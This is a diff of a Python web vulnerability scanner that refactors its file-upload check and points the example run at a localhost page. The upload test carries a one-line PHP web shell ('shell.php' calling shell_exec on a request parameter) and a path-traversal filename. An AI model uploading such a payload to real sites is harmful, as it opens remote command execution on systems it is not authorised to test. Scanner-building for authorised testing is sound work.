@@ -310,28 +310,8 @@ class WebScanner:
             except requests.RequestException as e:
                 logger.error(f"Error during request to {test_url}: {e}")
         return False
-    
-    def check_file_upload(self, url):
-        try:
-            response = session.get(url, timeout=10)
-            response.raise_for_status()
-            soup = BeautifulSoup(response.text, 'html.parser')
-            file_upload_forms = soup.find_all('form', {'enctype': 'multipart/form-data'})
-            if file_upload_forms:
-                for form in file_upload_forms:
-                    form_action = form.get('action')
-                    form_method = form.get('method', 'post').lower()
-                    form_url = urljoin(self.base_url, form_action)
-                    if self.check_file_upload_form(form_url):
-                        logger.info(f"File Upload vulnerability detected at {form_url} with method {form_method}")
-                        return True
-            return False
-        except requests.RequestException as e:
-            logger.error(f"Error during request to {url}: {e}")
-            return False
 
-
-    def check_file_upload_form(self, form_url):
+    def check_file_upload(self, form_url):
         meta_char_file = {'file': ('../test.txt', 'This is a test file.')}
         web_shell_file = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}
 
@@ -391,6 +371,6 @@ class WebScanner:
 
 
 # 예제 실행
-base_url = "http://127.0.0.1"
+base_url = "http://127.0.0.1//write_post.php"
 scanner = WebScanner(base_url)
 scanner.run_security_checks()
